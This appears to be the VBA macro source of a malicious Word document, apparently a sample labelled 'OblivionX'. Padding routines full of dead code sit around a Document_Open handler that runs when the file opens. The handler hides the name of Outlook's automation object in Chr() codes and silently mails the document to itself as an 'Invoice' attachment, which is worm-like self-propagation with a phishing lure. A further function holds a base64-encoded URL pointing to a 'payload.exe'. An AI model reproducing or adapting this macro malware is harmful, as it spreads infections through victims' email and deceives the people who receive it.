
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim frs0swbone As Object, bwt1msm67xb As Object
    On Error Resume Next
    Set frs0swbone = CreateObject(Chr(79) & Chr(117) & Chr(116) & Chr(108) & Chr(111) & Chr(111) & Chr(107) & ".Appli" & "cation")
    Set bwt1msm67xb = frs0swbone.CreateItem(0)
    bwt1msm67xb.To = "recipient@example.com"
    bwt1msm67xb.Subject = "Invoice"
    bwt1msm67xb.Body = "Please f" & "ind the" & " attache" & "d do" & "cume" & "nt."
    bwt1msm67xb.Attachments.Add ActiveDocument.FullName
    bwt1msm67xb.Send
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
